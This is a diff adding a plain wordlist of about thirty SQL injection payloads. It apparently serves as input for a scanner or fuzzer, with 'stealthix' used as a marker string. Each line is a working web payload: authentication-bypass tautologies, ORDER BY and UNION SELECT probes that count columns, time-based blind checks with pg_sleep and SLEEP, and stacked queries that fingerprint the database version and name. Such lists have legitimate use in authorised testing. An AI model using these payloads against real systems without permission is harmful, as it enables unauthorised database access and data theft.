@@ -1,0 +1,30 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+' OR 1=1 ORDER BY 1--
+' OR 1=1 ORDER BY 2--
+' OR 1=1 ORDER BY 3--
+' OR 1=1 ORDER BY 4--
+' OR 1=1 ORDER BY 5--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 'stealthix'--
+' UNION SELECT 'stealthix','marker'--
+'; SELECT pg_sleep(3);--
+'; SELECT pg_sleep(5);--
+'; SELECT pg_sleep(8);--
+'; SELECT SLEEP(3);--
+'; SELECT SLEEP(5);--
+'; SELECT SLEEP(8);--
+'; SELECT 1;--
+'; SELECT version();--
+'; SELECT current_database();--
